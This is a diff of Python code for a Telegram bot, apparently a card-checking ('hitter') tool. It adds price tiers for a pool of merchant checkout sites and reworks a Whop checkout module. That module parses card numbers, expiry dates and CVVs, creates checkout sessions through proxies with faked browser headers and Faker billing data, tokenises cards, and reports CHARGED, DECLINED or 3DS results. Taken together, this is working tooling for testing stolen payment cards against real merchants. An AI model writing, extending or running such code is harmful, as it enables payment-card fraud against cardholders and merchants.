-# ============ CHKADD SITE PROCESSING FUNCTION ============
 
-# ============ CHKADD SITE PROCESSING FUNCTION - BATCH MODE ============
 
 async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
     """
@@ -61128,9 +61529,11 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
     
     # Statistics
     all_good_sites = []
+    all_normal_sites = []
     all_bad_sites = []
     all_error_sites = []
-    added_count = 0
+    added_good_count = 0
+    added_normal_count = 0
     already_added = 0
     batch_results = []
     
@@ -61150,7 +61553,8 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
                 f"🚀 <b>CHKADD - Processing {total_sites} Sites</b>\n\n"
                 f"📊 Progress: Batch {batch_num + 1}/{total_batches}\n"
                 f"✅ GOOD found: {len(all_good_sites)}\n"
-                f"➕ Added: {added_count}\n"
+                f"📌 NORMAL found: {len(all_normal_sites)}\n"
+                f"➕ Added: {added_good_count + added_normal_count}\n"
                 f"🔄 Checking {len(batch_sites)} sites...\n\n"
                 f"<i>This may take up to 60 seconds per batch...</i>",
                 parse_mode=ParseMode.HTML
@@ -61164,14 +61568,16 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
             
             # Store results
             good_sites = results.get("good", [])
+            normal_sites = results.get("normal", [])  # <-- GET NORMAL SITES
             bad_sites = results.get("bad", [])
             error_sites = results.get("error", [])
             
             all_good_sites.extend(good_sites)
+            all_normal_sites.extend(normal_sites)  # <-- STORE NORMAL SITES
             all_bad_sites.extend(bad_sites)
             all_error_sites.extend(error_sites)
             
-            # Process GOOD sites from this batch
+            # ============ PROCESS GOOD SITES (under $5) ============
             for site_data in good_sites:
                 site = site_data["site"]
                 price = site_data["price"]
@@ -61195,10 +61601,37 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
                 
                 if success:
                     site_quality_tracker.force_mark_good(site, price)
-                    added_count += 1
+                    added_good_count += 1
                     print(f"✅ Added GOOD site: {site} (${price:.2f})")
             
-            print(f"📊 Batch {batch_num + 1} complete: {len(good_sites)} GOOD, {len(bad_sites)} BAD, {len(error_sites)} ERRORS")
+            # ============ PROCESS NORMAL SITES ($5-$10) ============
+            for site_data in normal_sites:
+                site = site_data["site"]
+                price = site_data["price"]
+                
+                # Check if already in rotation
+                if site in autosopi_site_manager.sites:
+                    already_added += 1
+                    continue
+                
+                # Add to rotation
+                user_name = update.effective_user.first_name or "Admin"
+                if update.effective_user.username:
+                    user_name += f" (@{update.effective_user.username})"
+                
+                success, msg = autosopi_site_manager.add_site(
+                    site,
+                    user_id,
+                    user_name,
+                    bypass_pending=True
+                )
+                
+                if success:
+                    site_quality_tracker.force_mark_normal(site, price)
+                    added_normal_count += 1
+                    print(f"✅ Added NORMAL site: {site} (${price:.2f})")
+            
+            print(f"📊 Batch {batch_num + 1} complete: {len(good_sites)} GOOD, {len(normal_sites)} NORMAL, {len(bad_sites)} BAD, {len(error_sites)} ERRORS")
             
         except Exception as e:
             print(f"❌ Batch {batch_num + 1} error: {e}")
@@ -61212,10 +61645,11 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
     minutes = int(elapsed // 60)
     seconds = int(elapsed % 60)
     
-    # Build final response
+    # ============ BUILD FINAL RESPONSE ============
     response = f"✅ <b>CHKADD Complete - All {total_sites} Sites Processed</b>\n\n"
     response += f"📊 <b>Results:</b>\n"
-    response += f"   ✅ GOOD sites found: {len(all_good_sites)}\n"
+    response += f"   🌟 GOOD sites found: {len(all_good_sites)}\n"
+    response += f"   📌 NORMAL sites found: {len(all_normal_sites)}\n"
     response += f"   ❌ Bad sites: {len(all_bad_sites)}\n"
     response += f"   ⚠️ Errors: {len(all_error_sites)}\n"
     response += f"   📝 Total checked: {total_sites}\n"
@@ -61225,18 +61659,32 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
     
     # GOOD sites
     if all_good_sites:
-        response += f"🌟 <b>GOOD Sites Found ({len(all_good_sites)}):</b>\n"
+        response += f"🌟 <b>GOOD Sites Added ({len(all_good_sites)}):</b>\n"
         for site_data in all_good_sites[:15]:
             response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
             response += f"     📝 {site_data['response'][:40]}\n"
         if len(all_good_sites) > 15:
             response += f"   ... and {len(all_good_sites) - 15} more\n"
-        
-        response += f"\n✅ <b>Added to rotation:</b> {added_count} sites\n"
+    
+    # NORMAL sites
+    if all_normal_sites:
+        response += f"\n📌 <b>NORMAL Sites Added ({len(all_normal_sites)}):</b>\n"
+        for site_data in all_normal_sites[:15]:
+            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(all_normal_sites) > 15:
+            response += f"   ... and {len(all_normal_sites) - 15} more\n"
+    
+    # Summary of additions
+    total_added = added_good_count + added_normal_count
+    if total_added > 0:
+        response += f"\n✅ <b>Added to rotation:</b>\n"
+        response += f"   🌟 GOOD: {added_good_count}\n"
+        response += f"   📌 NORMAL: {added_normal_count}\n"
         if already_added > 0:
             response += f"🔄 <b>Already in rotation:</b> {already_added} sites\n"
     else:
-        response += "❌ No GOOD sites found.\n"
+        response += "❌ No sites were added to rotation.\n"
     
     # Bad sites (show first few)
     if all_bad_sites:
@@ -61257,7 +61705,8 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
             response += f"   ... and {len(all_error_sites) - 5} more\n"
     
     response += f"\n━━━━━━━━━━━━━━━━━━━\n"
-    response += f"📊 Total GOOD sites in rotation: {len(site_quality_tracker.good_sites)}\n"
+    response += f"📊 Total GOOD sites: {len(site_quality_tracker.good_sites)}\n"
+    response += f"📊 Total NORMAL sites: {len(site_quality_tracker.normal_sites)}\n"
     response += f"🌐 Total sites in rotation: {len(autosopi_site_manager.sites)}\n"
     response += f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
     
@@ -61265,16 +61714,17 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
     
     print(f"\n{'='*80}")
     print(f"📊 CHKADD COMPLETE")
-    print(f"✅ GOOD: {len(all_good_sites)}")
+    print(f"🌟 GOOD: {len(all_good_sites)} (added: {added_good_count})")
+    print(f"📌 NORMAL: {len(all_normal_sites)} (added: {added_normal_count})")
     print(f"❌ Bad: {len(all_bad_sites)}")
     print(f"⚠️ Errors: {len(all_error_sites)}")
-    print(f"➕ Added: {added_count}")
+    print(f"➕ Total Added: {total_added}")
     print(f"⏱️ Time: {minutes}m {seconds}s")
     print(f"{'='*80}")
         
 async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
     """
-    Process CHKADD with the API pool
+    Process CHKADD with the API pool - handles GOOD, NORMAL, and BAD sites
     """
     user_id = update.effective_user.id
     message = update.effective_message
@@ -61311,17 +61761,30 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
     minutes = int(elapsed // 60)
     seconds = int(elapsed % 60)
     
-    # Process results and add GOOD sites to rotation
+    # Process results
     good_sites = results.get("good", [])
+    normal_sites = results.get("normal", [])  # <-- NORMAL sites from the API
     bad_sites = results.get("bad", [])
+    error_sites = results.get("error", [])
     
-    added_count = 0
+    # Also check the 'good' list for NORMAL sites (since we return True for both)
+    all_working_sites = good_sites + normal_sites
+    
+    added_good = 0
+    added_normal = 0
     already_added = 0
     
-    for site_data in good_sites:
+    # Process GOOD sites first (under $5)
+    for site_data in all_working_sites:
         site = site_data["site"]
         price = site_data["price"]
+        response = site_data.get("response", "")
         
+        # Determine if it's GOOD (under $5) or NORMAL ($5-$10)
+        is_good = price < 5
+        is_normal = 5 <= price < 10
+        
+        # Check if already in rotation
         if site in autosopi_site_manager.sites:
             already_added += 1
             continue
@@ -61338,15 +61801,22 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
         )
         
         if success:
-            site_quality_tracker.force_mark_good(site, price)
-            added_count += 1
-            print(f"✅ Added GOOD site: {site} (${price:.2f})")
+            if is_good:
+                site_quality_tracker.force_mark_good(site, price)
+                added_good += 1
+                print(f"✅ Added GOOD site: {site} (${price:.2f})")
+            elif is_normal:
+                site_quality_tracker.force_mark_normal(site, price)
+                added_normal += 1
+                print(f"✅ Added NORMAL site: {site} (${price:.2f})")
     
-    # Build response
+    # ============ BUILD RESPONSE ============
     response = f"✅ <b>CHKADD Enhanced - Complete</b>\n\n"
     response += f"📊 <b>Results:</b>\n"
-    response += f"   ✅ GOOD sites: {len(good_sites)}\n"
+    response += f"   🌟 GOOD sites (under $5): {len(good_sites)}\n"
+    response += f"   📌 NORMAL sites ($5-$10): {len(normal_sites)}\n"
     response += f"   ❌ Bad sites: {len(bad_sites)}\n"
+    response += f"   ⚠️ Errors: {len(error_sites)}\n"
     response += f"   📝 Total checked: {total_sites}\n"
     response += f"   ⏱️ Time: {minutes}m {seconds}s\n"
     response += f"━━━━━━━━━━━━━━━━━━━\n\n"
@@ -61354,26 +61824,38 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
     if good_sites:
         response += f"🌟 <b>GOOD Sites Found ({len(good_sites)}):</b>\n"
         for site_data in good_sites[:10]:
-            charged_text = " 🔥" if site_data.get('charged') else ""
-            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}{charged_text}\n"
+            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
             response += f"     📝 {site_data['response'][:40]}\n"
         if len(good_sites) > 10:
             response += f"   ... and {len(good_sites) - 10} more\n"
-        
-        response += f"\n✅ <b>Added to rotation:</b> {added_count} sites\n"
+    
+    if normal_sites:
+        response += f"\n📌 <b>NORMAL Sites Found ($5-$10 - {len(normal_sites)}):</b>\n"
+        for site_data in normal_sites[:10]:
+            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(normal_sites) > 10:
+            response += f"   ... and {len(normal_sites) - 10} more\n"
+    
+    if good_sites or normal_sites:
+        response += f"\n✅ <b>Added to rotation:</b>\n"
+        response += f"   🌟 GOOD: {added_good}\n"
+        response += f"   📌 NORMAL: {added_normal}\n"
         if already_added > 0:
             response += f"🔄 <b>Already in rotation:</b> {already_added} sites\n"
     
-    if bad_sites:
-        response += f"\n❌ <b>Bad Sites ({len(bad_sites)}):</b>\n"
-        for site_data in bad_sites[:5]:
+    if error_sites:
+        response += f"\n⚠️ <b>Errors (showing first 5 of {len(error_sites)}):</b>\n"
+        for site_data in error_sites[:5]:
             response += f"   • <code>{site_data['site']}</code>\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
-        if len(bad_sites) > 5:
-            response += f"   ... and {len(bad_sites) - 5} more\n"
+            response += f"     ❌ {site_data.get('error', 'Unknown error')[:50]}\n"
+        if len(error_sites) > 5:
+            response += f"   ... and {len(error_sites) - 5} more\n"
     
     response += f"\n━━━━━━━━━━━━━━━━━━━\n"
     response += f"📊 Total GOOD sites: {len(site_quality_tracker.good_sites)}\n"
+    response += f"📊 Total NORMAL sites: {len(site_quality_tracker.normal_sites)}\n"
+    response += f"🌐 Total sites in rotation: {len(autosopi_site_manager.sites)}\n"
     response += f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
     
     await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, reply_markup=back_menu())
@@ -61382,8 +61864,10 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
     print(f"\n{'='*80}")
     print(f"📊 CHKADD ENHANCED COMPLETE")
     print(f"✅ GOOD: {len(good_sites)}")
+    print(f"📌 NORMAL: {len(normal_sites)}")
     print(f"❌ Bad: {len(bad_sites)}")
-    print(f"➕ Added: {added_count}")
+    print(f"⚠️ Errors: {len(error_sites)}")
+    print(f"➕ Added GOOD: {added_good}, Added NORMAL: {added_normal}")
     print(f"⏱️ Time: {minutes}m {seconds}s")
     print(f"{'='*80}")
 
@@ -61944,7 +62428,7 @@ async def test_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ============ WHOP GATEWAY - WITH PREMIUM EMOJIS (LIKE SHOPIFY) ============
+# ============ WHOP GATEWAY - COMPLETE FIXED VERSION ============
 # Add this to your f13.py
 
 import re
@@ -61952,96 +62436,61 @@ import json
 import time
 import random
 import asyncio
-from typing import Dict, Optional
-from urllib.parse import urlparse, parse_qs
+import uuid
+from typing import Dict, Optional, List, Tuple
+from urllib.parse import urlparse
 import httpx
 from faker import Faker
-import uuid
 from datetime import datetime
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
 
 # ============ WHOP HITTER CONFIG ============
 WHOP_API = "https://whop.com/api/v1"
+WHOP_PUBLIC_API = "https://whop.com/api/v1/public"
 BASIS_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
 WHOP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
-           "Chrome/151.0.0.0 Safari/537.36")
+           "Chrome/152.0.0.0 Safari/537.36")
 
 # Active tasks for Whop Hitter
 whop_active_tasks = {}
 
-# ============ PREMIUM EMOJI IDs - UPDATE THESE WITH CORRECT IDs ============
-# Get correct IDs from @AdsMarkdownBot
+# ============ PREMIUM EMOJI IDs ============
 PREMIUM_EMOJI_IDS = {
-    # Status emojis
-    "charged": "5039670412733055750",      # 🔥 Fire - UPDATE THIS
-    "approved": "6266787022111773140",     # ✅ Checkmark - UPDATE THIS
-    "declined": "6267039884016358504",     # ❌ Cross mark - UPDATE THIS
-    "warning": "6267237615720731788",      # ⚠️ Warning - UPDATE THIS
-    "success": "5041796412954641308",      # 💎 Diamond - UPDATE THIS
-    
-    # Card/BIN related
-    "card": "5472250091332993630",         # 💳 Credit card - UPDATE THIS
-    "bank": "5332455502917949981",         # 🏦 Bank - UPDATE THIS
-    "money": "5201873447554145566",        # 💵 Money - UPDATE THIS
-    
-    # Gateway emojis
-    "paypal": "5039670412733055750",       # 🔥 - UPDATE THIS
-    "shopify": "5041796412954641308",      # 💎 - UPDATE THIS
-    
-    # UI elements
-    "time": "5382194935057372936",         # ⏱️ - UPDATE THIS
-    "stats": "5028746137645876535",        # 📊 - UPDATE THIS
-    "users": "5784914081165087232",        # 👥 - UPDATE THIS
-    
-    # Misc
-    "lock": "5197288647275071607",         # 🔐 - UPDATE THIS
-    "globe": "5447410659077661506",        # 🌐 - UPDATE THIS
-    "star": "6282793227057632654",         # ⭐ - UPDATE THIS
-    "skull": "5042167377869932162",        # 💀 - UPDATE THIS
-    "target": "5377336227533969892",       # 🎯 - UPDATE THIS
-    "toy": "5249244862359812334",          # 📌 - UPDATE THIS
-    "diamond": "5427168083074628963",      # 💎 - UPDATE THIS
-    "flower": "6230927657257668107",       # 🌸 - UPDATE THIS
-    "pink": "5041796412954641308",         # 💖 - UPDATE THIS
-    "doller": "5197434882321567830",       # 💵 - UPDATE THIS
-    "fire": "5471133374264684999",         # 🔥 - UPDATE THIS
-    "clock": "5262540380301191210",        # ⏱️ - UPDATE THIS
-    "id": "5307905813451397794",           # 🆔 - UPDATE THIS
-    "receipt": "5226929552319594190",      # 🧾 - UPDATE THIS
-    "info": "5042306247047513767",         # ℹ️ - UPDATE THIS
-    "error": "6282641460093260838",        # 🔴 - UPDATE THIS
+    "charged": "5039670412733055750",
+    "approved": "6266787022111773140",
+    "declined": "6267039884016358504",
+    "warning": "6267237615720731788",
+    "success": "5041796412954641308",
+    "error": "6282641460093260838",
+    "card": "5472250091332993630",
+    "bank": "5332455502917949981",
+    "money": "5201873447554145566",
+    "lock": "5197288647275071607",
+    "time": "5382194935057372936",
+    "stats": "5028746137645876535",
+    "skull": "5042167377869932162",
+    "target": "5377336227533969892",
+    "diamond": "5427168083074628963",
+    "fire": "5471133374264684999",
+    "globe": "5447410659077661506",
+    "clock": "5262540380301191210",
+    "id": "5307905813451397794",
+    "flash": "5397857289216484878",
+    "toy": "5249244862359812334",
+    "flower": "6230927657257668107",
+    "pink": "5041796412954641308",
+    "doller": "5197434882321567830",
 }
 
 def premium_emoji(emoji_id: str, fallback: str = "•") -> str:
-    """Generate premium emoji HTML tag"""
     return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
 
+def pe(emoji_id: str, fallback: str = "•") -> str:
+    return premium_emoji(emoji_id, fallback)
+
 # ============ WHOP HELPER FUNCTIONS ============
-
-def whop_extract_plan_id(url: str) -> Optional[str]:
-    m = re.search(r"/(plan_[A-Za-z0-9]+)", url)
-    return m.group(1) if m else None
-
-def whop_parse_card(text: str) -> Optional[Dict]:
-    parts = re.split(r"[|:/\\\-\s]+", text.strip())
-    if len(parts) < 4:
-        return None
-    cc = re.sub(r"\D", "", parts[0])
-    if not (15 <= len(cc) <= 19):
-        return None
-    month = parts[1].strip().zfill(2)
-    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
-        return None
-    year = parts[2].strip()
-    year = year[2:] if len(year) == 4 else year
-    if len(year) != 2:
-        return None
-    cvv = re.sub(r"\D", "", parts[3])
-    if not (3 <= len(cvv) <= 4):
-        return None
-    return {"cc": cc, "month": month, "year": year, "cvv": cvv}
 
 def whop_proxy_url(proxy: str) -> Optional[str]:
     if not proxy:
@@ -62078,7 +62527,213 @@ def whop_build_cookie(session_id: str, client_secret: str, sig_id: str = "") -> 
     }
     return "; ".join(f"{k}={v}" for k, v in jar.items())
 
+def whop_parse_card(text: str) -> Optional[Dict]:
+    parts = re.split(r"[|:/\\\-\s]+", text.strip())
+    if len(parts) < 4:
+        return None
+    cc = re.sub(r"\D", "", parts[0])
+    if not (15 <= len(cc) <= 19):
+        return None
+    month = parts[1].strip().zfill(2)
+    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
+        return None
+    year = parts[2].strip()
+    year = year[2:] if len(year) == 4 else year
+    if len(year) != 2:
+        return None
+    cvv = re.sub(r"\D", "", parts[3])
+    if not (3 <= len(cvv) <= 4):
+        return None
+    return {"cc": cc, "month": month, "year": year, "cvv": cvv}
+
 # ============ WHOP API FUNCTIONS ============
+
+async def whop_get_plan_from_api(product_slug: str, proxy: str = None) -> Optional[str]:
+    """
+    Get plan_id from Whop public API using the product slug.
+    """
+    try:
+        # Try the public API endpoint
+        api_url = f"{WHOP_PUBLIC_API}/products/slug/{product_slug}"
+        print(f"🔍 Fetching plan_id from API: {api_url}")
+        
+        async with whop_client(proxy, timeout=30.0) as c:
+            response = await c.get(
+                api_url,
+                headers={
+                    "user-agent": WHOP_UA,
+                    "accept": "application/json",
+                }
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                print(f"📄 API Response: {json.dumps(data, indent=2)[:500]}")
+                
+                # Look for plan_id in various places
+                if 'plan_id' in data:
+                    print(f"✅ Found plan_id from API: {data['plan_id']}")
+                    return data['plan_id']
+                
+                if 'id' in data and data['id'].startswith('plan_'):
+                    print(f"✅ Found plan_id from API: {data['id']}")
+                    return data['id']
+                
+                if 'plans' in data and data['plans']:
+                    plan = data['plans'][0]
+                    if 'id' in plan:
+                        print(f"✅ Found plan_id from API: {plan['id']}")
+                        return plan['id']
+                
+                # Search recursively for plan_ in the data
+                plan_id = whop_search_json_for_plan(data)
+                if plan_id:
+                    print(f"✅ Found plan_id from API search: {plan_id}")
+                    return plan_id
+            
+            print(f"⚠️ API returned status {response.status_code}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ Error fetching from API: {e}")
+        return None
+
+
+async def whop_get_plan_from_html(slug: str, proxy: str = None) -> Optional[str]:
+    """
+    Get plan_id from HTML page (fallback if API fails).
+    """
+    try:
+        url = f"https://whop.com/{slug}"
+        print(f"🔍 Fetching plan_id from HTML: {url}")
+        
+        async with whop_client(proxy, timeout=30.0) as c:
+            response = await c.get(
+                url,
+                headers={
+                    "user-agent": WHOP_UA,
+                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                }
+            )
+            
+            if response.status_code != 200:
+                print(f"❌ Failed to fetch page: HTTP {response.status_code}")
+                return None
+            
+            html = response.text
+            
+            # Look for checkout links
+            checkout_patterns = [
+                r'href=["\']/checkout/(plan_[A-Za-z0-9]+)["\']',
+                r'href=["\']https://whop\.com/checkout/(plan_[A-Za-z0-9]+)["\']',
+                r'<a[^>]*href=["\']/checkout/(plan_[A-Za-z0-9]+)["\'][^>]*>',
+            ]
+            
+            for pattern in checkout_patterns:
+                match = re.search(pattern, html, re.IGNORECASE)
+                if match:
+                    plan_id = match.group(1)
+                    if plan_id.startswith('plan_'):
+                        print(f"✅ Found plan_id from checkout link: {plan_id}")
+                        return plan_id
+            
+            # Look for plan_ in script tags
+            script_patterns = [
+                r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>',
+                r'<script[^>]*type="application/json"[^>]*>(.*?)</script>',
+            ]
+            
+            for pattern in script_patterns:
+                match = re.search(pattern, html, re.DOTALL)
+                if match:
+                    try:
+                        data = json.loads(match.group(1))
+                        plan_id = whop_search_json_for_plan(data)
+                        if plan_id:
+                            print(f"✅ Found plan_id from JSON: {plan_id}")
+                            return plan_id
+                    except:
+                        continue
+            
+            print(f"⚠️ Could not find plan_id in HTML")
+            return None
+            
+    except Exception as e:
+        print(f"❌ Error fetching HTML: {e}")
+        return None
+
+
+def whop_search_json_for_plan(obj, depth=0):
+    """Recursively search for plan_ in JSON data."""
+    if depth > 15:
+        return None
+    
+    if isinstance(obj, dict):
+        # Check for plan keys
+        plan_keys = ['plan', 'planId', 'plan_id', 'id']
+        for key in plan_keys:
+            if key in obj:
+                value = obj[key]
+                if isinstance(value, str):
+                    if value.startswith('plan_'):
+                        return value
+                    # If it's a product ID, check if there's a plan reference
+                    if len(value) > 10 and value.isalnum():
+                        # Check if there's a type field indicating it's a plan
+                        if 'type' in obj and obj['type'] == 'plan':
+                            return value
+        
+        # Recurse into values
+        for value in obj.values():
+            result = whop_search_json_for_plan(value, depth + 1)
+            if result:
+                return result
+                
+    elif isinstance(obj, list):
+        for item in obj:
+            result = whop_search_json_for_plan(item, depth + 1)
+            if result:
+                return result
+    
+    return None
+
+
+async def whop_get_plan_from_url(checkout_url: str, proxy: str = None) -> Optional[str]:
+    """
+    Extract plan_id from URL or fetch from API/HTML.
+    """
+    # Check if URL already has plan_
+    match = re.search(r'/(plan_[A-Za-z0-9]+)', checkout_url)
+    if match:
+        return match.group(1)
+    
+    # Check if URL has chs_
+    match = re.search(r'/(chs_[A-Za-z0-9]+)', checkout_url)
+    if match:
+        return match.group(1)
+    
+    # Check if URL is a product page (slug format)
+    parsed = urlparse(checkout_url)
+    path = parsed.path.strip('/')
+    parts = path.split('/')
+    
+    if len(parts) >= 2:
+        product_slug = parts[1]  # Get the product slug
+        print(f"📡 Product slug: {product_slug}")
+        
+        # Try API first (most reliable)
+        plan_id = await whop_get_plan_from_api(product_slug, proxy)
+        if plan_id:
+            return plan_id
+        
+        # Try HTML fallback
+        slug = f"{parts[0]}/{parts[1]}"
+        plan_id = await whop_get_plan_from_html(slug, proxy)
+        if plan_id:
+            return plan_id
+    
+    return None
+
 
 async def whop_create_session(plan_id: str, checkout_url: str, proxy: str = None) -> Optional[Dict]:
     try:
@@ -62098,8 +62753,23 @@ async def whop_create_session(plan_id: str, checkout_url: str, proxy: str = None
                 "origin": "https://whop.com",
                 "referer": checkout_url,
             }
-            r = await c.post(f"{WHOP_API}/checkout_sessions",
-                             headers=headers, json={"link": plan_id})
+            
+            # Determine payload
+            if plan_id.startswith('plan_'):
+                payload = {"link": plan_id}
+                print(f"📡 Using plan_id: {plan_id}")
+            elif plan_id.startswith('chs_'):
+                payload = {"checkout_session_id": plan_id}
+                print(f"📡 Using checkout_session_id: {plan_id}")
+            else:
+                payload = {"product_id": plan_id}
+                print(f"📡 Using product_id: {plan_id}")
+            
+            r = await c.post(
+                f"{WHOP_API}/checkout_sessions",
+                headers=headers,
+                json=payload
+            )
 
         if r.status_code not in (200, 201):
             print(f"❌ whop_create_session: HTTP {r.status_code} — {r.text[:200]}")
@@ -62107,11 +62777,12 @@ async def whop_create_session(plan_id: str, checkout_url: str, proxy: str = None
 
         d = r.json()
         d["_sig_id"] = sig_id
-        print(f"✅ Whop session created: {d['id']}  client_secret: {d['client_secret'][:40]}…")
+        print(f"✅ Whop session created: {d['id']}")
         return d
     except Exception as e:
         print(f"❌ whop_create_session error: {e}")
         return None
+
 
 async def whop_tokenise_card(card: Dict, proxy: str = None) -> Optional[str]:
     try:
@@ -62146,6 +62817,7 @@ async def whop_tokenise_card(card: Dict, proxy: str = None) -> Optional[str]:
     except Exception as e:
         print(f"❌ Tokenise error: {e}")
         return None
+
 
 async def whop_create_confirmation_token(session_id: str, card_token: str,
                                           billing: Dict, cookie: str,
@@ -62198,7 +62870,6 @@ async def whop_create_confirmation_token(session_id: str, card_token: str,
         print(f"❌ Confirmation token error: {e}")
         return None
 
-# ============ FIXED WHOP_CONFIRM_CHECKOUT ============
 
 async def whop_confirm_checkout(session_id: str, confirmation_token: str,
                                  client_secret: str, cookie: str,
@@ -62228,25 +62899,21 @@ async def whop_confirm_checkout(session_id: str, confirmation_token: str,
         except Exception:
             return {"error": r.text[:200], "http": r.status_code}
         
-        # ============ FIXED: Check for 3DS in response ============
-        # Check payment status
+        # Check for 3DS
         payment = response_data.get("payment") or {}
         payment_status = payment.get("status", "")
         
         if payment_status == "requires_action":
             response_data["_3ds_required"] = True
-            print(f"🔐 [WHOP] 3DS Required detected in confirm response")
+            print(f"🔐 [WHOP] 3DS Required detected")
         
         return response_data
     except Exception as e:
         return {"error": str(e)}
 
-# ============ FIXED WHOP_POLL_STATUS - DETECTS 3DS ============
 
-# ============ FIXED WHOP_POLL_STATUS ============
-
-async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
-                            proxy: str = None, attempts: int = 15) -> Dict:
+async def whop_poll_payment_status(session_id: str, cookie: str, proxy: str = None, max_attempts: int = 15) -> Dict:
+    """Poll checkout session for payment status."""
     headers = {
         "accept": "*/*",
         "api-version-date": "2026-08-21",
@@ -62254,50 +62921,44 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
         "user-agent": WHOP_UA,
         "cookie": cookie,
     }
-    url = f"{WHOP_API}/checkout_sessions/{session_id}?client_secret={client_secret}"
+    url = f"{WHOP_API}/checkout_sessions/{session_id}"
     
-    for i in range(attempts):
+    for attempt in range(max_attempts):
         await asyncio.sleep(2)
+        
         try:
             async with whop_client(proxy) as c:
                 r = await c.get(url, headers=headers)
+                
             if r.status_code == 200:
-                d = r.json()
-                pay = d.get("payment") or {}
-                ps = pay.get("status", "")
-                ss = d.get("status", "")
-                err = d.get("last_confirm_error") or {}
+                data = r.json()
+                payment = data.get("payment") or {}
+                pay_status = payment.get("status", "")
+                session_status = data.get("status", "")
                 
-                print(f"  poll {i+1}/{attempts}: session={ss} payment={ps}")
+                print(f"  poll {attempt+1}/{max_attempts}: payment={pay_status}, session={session_status}")
                 
-                # ============ FIX: Check for 3DS first ============
-                if ps == "requires_action" or ss == "requires_action":
-                    return {"final": "3DS_REQUIRED", "data": d, "message": "3D Secure required"}
+                if pay_status == "requires_action" or session_status == "requires_action":
+                    return {"final": "3DS_REQUIRED", "message": "3D Secure required", "data": data}
                 
-                if ps == "succeeded":
-                    return {"final": "CHARGED", "data": d, "message": "Payment successful"}
+                if pay_status == "succeeded":
+                    return {"final": "CHARGED", "message": "Payment successful", "data": data}
                 
-                if ps == "failed" or err.get("code"):
-                    err_msg = err.get("message", ps)
-                    return {"final": "DECLINED", "message": err_msg, "data": d}
+                if pay_status == "failed":
+                    return {"final": "DECLINED", "message": "Payment failed", "data": data}
                 
-                # ============ FIX: If still processing after many attempts, check for 3DS ============
-                if ps == "processing" and i >= attempts - 3:
-                    # Still processing - might be 3DS waiting
-                    print(f"  ⏳ Still processing, checking for 3DS...")
-                    # Check if there's a 3DS indicator in the data
-                    if "3d" in str(d).lower() or "secure" in str(d).lower():
-                        return {"final": "3DS_REQUIRED", "data": d, "message": "3D Secure required"}
+                if pay_status == "processing" and attempt >= max_attempts - 3:
+                    if "3d" in str(data).lower() or "secure" in str(data).lower():
+                        return {"final": "3DS_REQUIRED", "message": "3D Secure required", "data": data}
+                    return {"final": "PROCESSING", "message": "Payment still processing", "data": data}
                     
         except Exception as e:
-            print(f"  poll {i+1}/{attempts}: error {e}")
+            print(f"  poll {attempt+1}/{max_attempts}: error {e}")
             continue
     
-    return {"final": "TIMEOUT", "message": "Payment processing timeout", "data": {}}
+    return {"final": "TIMEOUT", "message": "Payment status check timed out", "data": {}}
 
-
-
-# ============ FIXED WHOP_HIT - BETTER POLLING ============
+# ============ MAIN WHOP HIT FUNCTION ============
 
 async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
     t0 = time.time()
@@ -62305,17 +62966,23 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
            "elapsed": 0, "message": "", "amount": 0, "currency": "USD"}
 
     try:
-        plan_id = whop_extract_plan_id(checkout_url)
+        # ============ STEP 1: Get plan_id ============
+        plan_id = await whop_get_plan_from_url(checkout_url, proxy)
+        
         if not plan_id:
             out["status"] = "ERROR"
-            out["message"] = "No plan_id in URL"
+            out["message"] = "Could not find product/plan ID"
+            out["elapsed"] = round(time.time() - t0, 2)
             return out
+        
         print(f"🔗 plan_id={plan_id}")
 
+        # ============ STEP 2: Create checkout session ============
         sess = await whop_create_session(plan_id, checkout_url, proxy)
         if not sess:
             out["status"] = "ERROR"
             out["message"] = "Session creation failed"
+            out["elapsed"] = round(time.time() - t0, 2)
             return out
 
         session_id = sess["id"]
